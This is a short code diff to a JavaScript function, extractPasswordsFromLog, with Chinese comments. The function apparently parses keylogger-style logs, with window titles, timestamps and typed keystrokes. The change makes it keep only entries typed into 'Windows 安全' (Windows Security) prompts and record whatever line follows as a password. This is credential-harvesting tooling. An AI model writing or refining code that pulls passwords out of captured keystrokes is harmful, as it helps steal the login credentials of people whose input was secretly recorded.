@@ -1274,8 +1274,8 @@ function extractPasswordsFromLog(content, filename) {
     
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
-        // 查找包含时间戳的行
-        if (line.startsWith('[Window:')) {
+        // 查找包含时间戳的行，且窗口标题包含 "Windows 安全" 或 "Windows 安全中心"
+        if (line.startsWith('[Window:') && (line.includes('Windows 安全') || line.includes('Windows 安全中心'))) {
             // 提取时间戳
             const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
             const timestamp = timestampMatch ? timestampMatch[1] : '未知';
@@ -1283,8 +1283,8 @@ function extractPasswordsFromLog(content, filename) {
             // 检查下一行是否包含密码
             if (i + 1 < lines.length) {
                 const nextLine = lines[i + 1].trim();
-                // 密码模式：包含字母数字和可能的特殊键如 [RSHIFT][TAB] 等
-                if (nextLine && !nextLine.startsWith('[')) {
+                // 密码模式：非空行，可能包含字母、数字和特殊键
+                if (nextLine) {
                     passwords.push({
                         file: filename,
                         timestamp: timestamp,
